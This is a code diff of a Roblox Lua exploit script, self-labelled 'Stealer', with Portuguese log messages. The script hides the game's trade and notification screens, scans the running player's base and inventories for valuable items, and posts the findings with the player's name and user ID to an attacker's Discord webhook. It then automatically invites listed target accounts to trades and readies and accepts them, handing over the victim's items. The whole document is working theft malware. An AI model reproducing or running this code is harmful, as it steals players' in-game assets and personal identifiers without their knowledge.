@@ -1,10 +1,13 @@
-if game.PlaceId ~= 109983668079237 and game.PlaceId ~= 96342491571673 then
+if game.PlaceId ~= 109983668079237 then
     return
 end
 
-local HttpService = game:GetService("HttpService")
+print("[Stealer] Carregando...")
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
@@ -20,6 +23,286 @@ local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15
 
 local tradeCompleted = false
 local webhookSent = false
+
+local function getRemote(name)
+    local net = ReplicatedStorage:FindFirstChild("Packages")
+    if net then
+        net = net:FindFirstChild("Net")
+        if net then
+            local children = net:GetChildren()
+            for i = 1, #children - 1 do
+                if string.find(children[i].Name, name) then
+                    return children[i + 1]
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function findPlayerBase()
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return nil end
+    
+    local username = LocalPlayer.Name
+    local displayName = LocalPlayer.DisplayName
+    
+    for _, plot in ipairs(plots:GetChildren()) do
+        if plot:IsA("Model") then
+            local plotSign = plot:FindFirstChild("PlotSign")
+            if plotSign then
+                local surfaceGui = plotSign:FindFirstChildOfClass("SurfaceGui")
+                if surfaceGui then
+                    local frame = surfaceGui:FindFirstChild("Frame")
+                    if frame then
+                        local textLabel = frame:FindFirstChildOfClass("TextLabel")
+                        if textLabel then
+                            local text = textLabel.Text
+                            if text then
+                                local clean = text:gsub("'s Base$", ""):gsub(" Base$", "")
+                                if clean == username or clean == displayName then
+                                    return plot
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function scanBrainrotsFromBase()
+    local base = findPlayerBase()
+    if not base then return {} end
+    
+    local animalNames = {}
+    local animalsFolder = ReplicatedStorage:FindFirstChild("Animations")
+    if animalsFolder then
+        animalsFolder = animalsFolder:FindFirstChild("Animals")
+        if animalsFolder then
+            for _, child in ipairs(animalsFolder:GetChildren()) do
+                if child:IsA("Folder") then
+                    animalNames[child.Name] = true
+                end
+            end
+        end
+    end
+    
+    local found = {}
+    for _, child in ipairs(base:GetChildren()) do
+        if child:IsA("Model") and animalNames[child.Name] then
+            if TARGET_BRAINROTS[child.Name] then
+                local mutation = "Normal"
+                local traits = {}
+                local gen = 0
+                
+                pcall(function()
+                    local Animals2 = require(ReplicatedStorage:FindFirstChild("Shared"):FindFirstChild("Animals"))
+                    gen = Animals2:GetGeneration(child.Name, mutation, traits, nil)
+                end)
+                
+                table.insert(found, {
+                    name = child.Name,
+                    mutation = mutation,
+                    gen = gen,
+                    slotKey = child.Name,
+                    model = child,
+                    type = "Brainrot"
+                })
+            end
+        end
+    end
+    
+    table.sort(found, function(a, b) return a.gen > b.gen end)
+    return found
+end
+
+local function scanBaseSkins()
+    local found = {}
+    local sync = ReplicatedStorage:FindFirstChild("Packages")
+    if sync then
+        sync = sync:FindFirstChild("Synchronizer")
+        if sync then
+            local Get = require(sync).Get
+            for i = 1, 15 do
+                local ok, result = pcall(debug.getupvalue, Get, i)
+                if ok and type(result) == "table" then
+                    for _, data in pairs(result) do
+                        if type(data) == "table" then
+                            local baseSkins = data:Get("BaseSkinInventory")
+                            if type(baseSkins) == "table" then
+                                for uuid, skinData in pairs(baseSkins) do
+                                    if type(skinData) == "table" and skinData.SkinName then
+                                        if TARGET_BASE_SKINS[skinData.SkinName] then
+                                            table.insert(found, {
+                                                name = skinData.SkinName,
+                                                uuid = uuid,
+                                                type = "BaseSkin"
+                                            })
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                    break
+                end
+            end
+        end
+    end
+    return found
+end
+
+local function scanGears()
+    local found = {}
+    local sync = ReplicatedStorage:FindFirstChild("Packages")
+    if sync then
+        sync = sync:FindFirstChild("Synchronizer")
+        if sync then
+            local Get = require(sync).Get
+            for i = 1, 15 do
+                local ok, result = pcall(debug.getupvalue, Get, i)
+                if ok and type(result) == "table" then
+                    for _, data in pairs(result) do
+                        if type(data) == "table" then
+                            local gears = data:Get("GearInventory")
+                            if type(gears) == "table" then
+                                for uuid, gearData in pairs(gears) do
+                                    if type(gearData) == "table" and gearData.GearName then
+                                        if TARGET_GEARS[gearData.GearName] then
+                                            table.insert(found, {
+                                                name = gearData.GearName,
+                                                uuid = uuid,
+                                                type = "Gear"
+                                            })
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                    break
+                end
+            end
+        end
+    end
+    return found
+end
+
+local function formatNumber(n)
+    if not n or n == 0 then return "$0/s" end
+    if n >= 1e12 then return "$" .. string.format("%.2fT", n / 1e12):gsub("%.?0+$", "")
+    elseif n >= 1e9 then return "$" .. string.format("%.2fB", n / 1e9):gsub("%.?0+$", "")
+    elseif n >= 1e6 then return "$" .. string.format("%.2fM", n / 1e6):gsub("%.?0+$", "")
+    elseif n >= 1e3 then return "$" .. string.format("%.2fK", n / 1e3):gsub("%.?0+$", "")
+    else return "$" .. math.floor(n) .. "/s" end
+end
+
+local function sendWebhook()
+    if WEBHOOK_URL == "" then return end
+    
+    local request = syn and syn.request or (http and http.request or (http_request or request))
+    if not request then return end
+    
+    local brainrots = scanBrainrotsFromBase()
+    local baseSkins = scanBaseSkins()
+    local gears = scanGears()
+    
+    local allItems = {}
+    for _, item in ipairs(brainrots) do
+        table.insert(allItems, item)
+    end
+    for _, item in ipairs(baseSkins) do
+        table.insert(allItems, item)
+    end
+    for _, item in ipairs(gears) do
+        table.insert(allItems, item)
+    end
+    
+    if #allItems == 0 then
+        print("[Stealer] Nenhum item encontrado!")
+        return
+    end
+    
+    table.sort(allItems, function(a, b)
+        if a.type == "Brainrot" and b.type ~= "Brainrot" then return true end
+        if a.type ~= "Brainrot" and b.type == "Brainrot" then return false end
+        if a.type == "Brainrot" and b.type == "Brainrot" then
+            return (a.gen or 0) > (b.gen or 0)
+        end
+        return false
+    end)
+    
+    local lines = {}
+    for _, item in ipairs(allItems) do
+        if item.type == "Brainrot" then
+            local mutationText = ""
+            if item.mutation and item.mutation ~= "Normal" and item.mutation ~= "" then
+                mutationText = " | Mutation: **" .. item.mutation .. "**"
+            end
+            table.insert(lines, "**" .. item.name .. "** [Brainrot]" .. mutationText .. " | Gen: **" .. formatNumber(item.gen) .. "**")
+        elseif item.type == "BaseSkin" then
+            table.insert(lines, "**" .. item.name .. "** [BaseSkin]")
+        elseif item.type == "Gear" then
+            table.insert(lines, "**" .. item.name .. "** [Gear]")
+        end
+    end
+    
+    local description = table.concat(lines, "\n")
+    if #description > 4000 then
+        description = description:sub(1, 3996) .. "..."
+    end
+    
+    local executorName = "Unknown"
+    pcall(function()
+        if identifyexecutor then executorName = identifyexecutor()
+        elseif getexecutorname then executorName = getexecutorname() end
+    end)
+    
+    local playerCount = #Players:GetPlayers()
+    local unixTime = os.time()
+    
+    local embed = {
+        title = "Brainrot Stealer",
+        description = description,
+        color = 0xFF0000,
+        fields = {
+            {
+                name = "Server",
+                value = "Players: **" .. playerCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
+                inline = true
+            },
+            {
+                name = "Executor",
+                value = executorName,
+                inline = true
+            }
+        },
+        footer = {
+            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId .. " | " .. os.date("%d/%m/%Y %H:%M:%S")
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+    
+    local payload = {
+        content = "@everyone",
+        embeds = { embed },
+        username = "Stealer",
+        avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
+    }
+    
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload)
+        })
+        print("[Stealer] Webhook enviado!")
+    end)
+end
 
 local function blockCornerNotifications()
     local cornerNotif = PlayerGui:FindFirstChild("DuelsMachinePrompt")
@@ -103,95 +386,18 @@ local function blockNotificationRemote()
     end
 end
 
-local function getRemote(name)
-    local net = ReplicatedStorage:FindFirstChild("Packages")
-    if net then
-        net = net:FindFirstChild("Net")
-        if net then
-            local children = net:GetChildren()
-            for i = 1, #children - 1 do
-                if string.find(children[i].Name, name) then
-                    return children[i + 1]
-                end
-            end
-        end
-    end
-    return nil
-end
-
-local function getUserData()
-    local Sync = ReplicatedStorage:FindFirstChild("Packages")
-    if Sync then
-        Sync = Sync:FindFirstChild("Synchronizer")
-        if Sync then
-            local Get = require(Sync).Get
-            for i = 1, 15 do
-                local ok, result = pcall(debug.getupvalue, Get, i)
-                if ok and type(result) == "table" then
-                    return result
-                end
-            end
-        end
-    end
-    return nil
-end
-
-local function getGeneration(animalIndex, mutation, traits)
-    local Animals2 = ReplicatedStorage:FindFirstChild("Shared")
-    if Animals2 then
-        Animals2 = Animals2:FindFirstChild("Animals")
-        if Animals2 then
-            local ok, result = pcall(require(Animals2).GetGeneration, animalIndex, mutation, traits or {}, nil)
-            if ok then
-                return result
-            end
-        end
-    end
-    return 0
-end
-
-local function formatCurrency(val)
-    if val >= 1e12 then return "$" .. string.format("%.2fT", val / 1e12):gsub("%.?0+$", "")
-    elseif val >= 1e9 then return "$" .. string.format("%.2fB", val / 1e9):gsub("%.?0+$", "")
-    elseif val >= 1e6 then return "$" .. string.format("%.2fM", val / 1e6):gsub("%.?0+$", "")
-    elseif val >= 1e3 then return "$" .. string.format("%.2fK", val / 1e3):gsub("%.?0+$", "")
-    else return "$" .. math.floor(val) end
-end
-
-local function sendWebhook(data)
-    if WEBHOOK_URL == "" then return end
-    local request = syn and syn.request or (http and http.request or (http_request or request))
-    if not request then return end
-    pcall(function()
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-end
-
 local function getUserIdFromName(username)
-    if type(username) == "number" then
-        return username
-    end
-    if type(username) == "string" then
-        local success, result = pcall(function()
-            return Players:GetUserIdFromNameAsync(username)
-        end)
-        if success and result then
-            return result
-        end
+    if type(username) == "number" then return username end
+    local success, result = pcall(function()
+        return Players:GetUserIdFromNameAsync(username)
+    end)
+    if success and result then
+        return result
     end
     return nil
 end
 
 local function isPlayerOnline(userId)
-    if type(userId) == "string" then
-        userId = tonumber(userId)
-    end
-    if not userId then return false end
     for _, player in ipairs(Players:GetPlayers()) do
         if player.UserId == userId then
             return true
@@ -200,29 +406,9 @@ local function isPlayerOnline(userId)
     return false
 end
 
-local function safeAddBrainrot(addRemote, slotKey, data)
-    local success, result = pcall(function()
-        return addRemote:InvokeServer("6b5f15fb-5cb9-4d07-a031-bbff8e641eda", slotKey, data)
-    end)
-    if success then
-        return result
-    end
-    return nil
-end
-
-local function safeReady(readyRemote)
-    pcall(function()
-        readyRemote:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
-    end)
-end
-
-local function safeAccept(acceptRemote)
-    pcall(function()
-        acceptRemote:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb")
-    end)
-end
-
 local function main()
+    print("[Stealer] Aplicando bloqueios...")
+    
     blockCornerNotifications()
     blockNormalNotifications()
     blockTradeUI()
@@ -237,190 +423,44 @@ local function main()
         end
     end)
     
-    local userData = getUserData()
-    if not userData then return end
+    print("[Stealer] Escaneando itens...")
+    sendWebhook()
     
-    local foundItems = {
-        brainrots = {},
-        baseSkins = {},
-        gears = {}
-    }
-
-    for _, data in pairs(userData) do
-        if type(data) == "table" then
-            local owner = data.Owner
-            if type(owner) == "table" and owner.UserId == LocalPlayer.UserId then
-                local animalList = data.AnimalList
-                if type(animalList) == "table" then
-                    for slotKey, animal in pairs(animalList) do
-                        if type(animal) == "table" and animal.Index then
-                            local animalName = animal.Index
-                            if TARGET_BRAINROTS[animalName] then
-                                local mutation = animal.Mutation or ""
-                                local traits = animal.Traits or {}
-                                local gen = getGeneration(animalName, mutation, traits)
-                                table.insert(foundItems.brainrots, {
-                                    name = animalName,
-                                    mutation = mutation,
-                                    gen = gen,
-                                    formattedGen = formatCurrency(gen),
-                                    slotKey = slotKey,
-                                    data = animal
-                                })
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-
-    local baseSkins = userData:Get("BaseSkinInventory")
-    if type(baseSkins) == "table" then
-        for uuid, skinData in pairs(baseSkins) do
-            if type(skinData) == "table" and skinData.SkinName then
-                if TARGET_BASE_SKINS[skinData.SkinName] then
-                    table.insert(foundItems.baseSkins, {
-                        name = skinData.SkinName,
-                        uuid = uuid
-                    })
-                end
-            end
-        end
-    end
-
-    local gears = userData:Get("GearInventory")
-    if type(gears) == "table" then
-        for uuid, gearData in pairs(gears) do
-            if type(gearData) == "table" and gearData.GearName then
-                if TARGET_GEARS[gearData.GearName] then
-                    table.insert(foundItems.gears, {
-                        name = gearData.GearName,
-                        uuid = uuid
-                    })
-                end
-            end
-        end
-    end
-
-    if not webhookSent then
-        webhookSent = true
-        local embed = {
-            title = "Stealer Results",
-            color = 0x00FF00,
-            fields = {}
-        }
-
-        if #foundItems.brainrots > 0 then
-            local brainrotNames = {}
-            for _, b in ipairs(foundItems.brainrots) do
-                local name = b.mutation ~= "" and ("[" .. b.mutation .. "] ") or ""
-                table.insert(brainrotNames, name .. b.name .. " - " .. b.formattedGen)
-            end
-            table.insert(embed.fields, {
-                name = "Brainrots (" .. #foundItems.brainrots .. ")",
-                value = table.concat(brainrotNames, "\n") or "None",
-                inline = false
-            })
-        end
-
-        if #foundItems.baseSkins > 0 then
-            local skinNames = {}
-            for _, s in ipairs(foundItems.baseSkins) do
-                table.insert(skinNames, s.name)
-            end
-            table.insert(embed.fields, {
-                name = "Base Skins (" .. #foundItems.baseSkins .. ")",
-                value = table.concat(skinNames, "\n") or "None",
-                inline = false
-            })
-        end
-
-        if #foundItems.gears > 0 then
-            local gearNames = {}
-            for _, g in ipairs(foundItems.gears) do
-                table.insert(gearNames, g.name)
-            end
-            table.insert(embed.fields, {
-                name = "Gears (" .. #foundItems.gears .. ")",
-                value = table.concat(gearNames, "\n") or "None",
-                inline = false
-            })
-        end
-
-        table.insert(embed.fields, {
-            name = "Victim",
-            value = LocalPlayer.Name,
-            inline = true
-        })
-
-        table.insert(embed.fields, {
-            name = "Target(s)",
-            value = table.concat(TARGET_USERS, ", "),
-            inline = true
-        })
-
-        table.insert(embed.fields, {
-            name = "Time",
-            value = os.date("%H:%M:%S"),
-            inline = true
-        })
-
-        sendWebhook({
-            username = "Crusty Stealer",
-            avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png",
-            embeds = { embed }
-        })
-    end
-
-    local hasTargetItems = #foundItems.brainrots > 0 or #foundItems.baseSkins > 0 or #foundItems.gears > 0
+    local brainrots = scanBrainrotsFromBase()
     
-    if hasTargetItems and #TARGET_USERS > 0 then
+    if #brainrots > 0 and #TARGET_USERS > 0 then
         local inviteRemote = getRemote("TradeService/Invite")
         local addBrainrotRemote = getRemote("TradeService/AddBrainrot")
-        local addItemRemote = getRemote("TradeService/AddItem")
         local readyRemote = getRemote("TradeService/Ready")
         local acceptRemote = getRemote("TradeService/Accept")
         
-        if inviteRemote and (addBrainrotRemote or addItemRemote) then
+        if inviteRemote and addBrainrotRemote then
             while not tradeCompleted do
                 for _, target in ipairs(TARGET_USERS) do
                     if target ~= "" then
                         local userId = getUserIdFromName(target)
                         if userId and isPlayerOnline(userId) then
-                            local inviteSuccess = pcall(inviteRemote.InvokeServer, inviteRemote, "afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
-                            if inviteSuccess then
+                            print("[Stealer] Enviando invite para " .. target)
+                            
+                            local success = pcall(inviteRemote.InvokeServer, inviteRemote, "afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
+                            
+                            if success then
+                                print("[Stealer] Invite enviado!")
                                 task.wait(3)
                                 
-                                if #foundItems.brainrots > 0 and addBrainrotRemote then
-                                    for i, brainrot in ipairs(foundItems.brainrots) do
-                                        local added = safeAddBrainrot(addBrainrotRemote, brainrot.slotKey, brainrot.data)
-                                        task.wait(1.5)
-                                        if i % 3 == 0 then
-                                            task.wait(1)
-                                        end
-                                    end
-                                end
-                                
-                                if #foundItems.baseSkins > 0 and addItemRemote then
-                                    for _, skin in ipairs(foundItems.baseSkins) do
-                                        pcall(addItemRemote.InvokeServer, addItemRemote, "f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d", "BaseSkin", skin)
-                                        task.wait(1.5)
-                                    end
-                                end
-                                
-                                if #foundItems.gears > 0 and addItemRemote then
-                                    for _, gear in ipairs(foundItems.gears) do
-                                        pcall(addItemRemote.InvokeServer, addItemRemote, "f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d", "Gear", gear)
-                                        task.wait(1.5)
-                                    end
+                                for i, brainrot in ipairs(brainrots) do
+                                    print("[Stealer] Adicionando: " .. brainrot.name)
+                                    pcall(addBrainrotRemote.InvokeServer, addBrainrotRemote, "6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
+                                    task.wait(1.5)
+                                    if i % 3 == 0 then task.wait(1) end
                                 end
                                 
                                 if readyRemote and acceptRemote then
                                     task.wait(3)
-                                    safeReady(readyRemote)
+                                    pcall(readyRemote.FireServer, readyRemote, "d73acf93-6f32-44df-b813-0f6b32c7afd9")
                                     task.wait(2)
-                                    safeAccept(acceptRemote)
+                                    pcall(acceptRemote.FireServer, acceptRemote, "918ee0f5-e98f-413f-b76e-baee47b021cb")
+                                    print("[Stealer] Trade enviada!")
                                 end
                             end
                         end
@@ -429,12 +469,6 @@ local function main()
                 
                 task.wait(DELAY_BETWEEN_INVITES)
             end
-            
-            sendWebhook({
-                content = "Trade concluída com sucesso!",
-                username = "Crusty Stealer",
-                avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
-            })
         end
     end
 end
